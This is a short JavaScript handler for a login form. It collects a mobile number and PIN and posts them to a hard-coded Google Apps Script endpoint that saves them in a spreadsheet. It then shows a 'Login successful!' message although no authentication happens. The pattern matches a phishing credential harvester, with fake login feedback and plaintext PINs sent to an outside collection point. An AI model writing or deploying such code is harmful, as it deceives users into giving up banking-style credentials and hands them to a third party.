document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    const data = {
        "mobile": username,
        "pin": password
    };

    // Replace this with your Google Sheets URL
    const sheetUrl = "https://script.google.com/macros/s/AKfycbzRFq-GyWMZ1IWfgOwNLIYCTp33n9xUoiNuaNCPi-PN5XwzCBbDjkaPxf8iDR60_LxK/exec";

    fetch(sheetUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
    })
    .then(response => response.text())
    .then(result => {
        alert("Login successful! Data saved in Google Sheets.");
        document.getElementById("loginForm").reset();
    })
    .catch(error => {
        console.error("Error:", error);
        alert("Error: Could not save data.");
    });

});
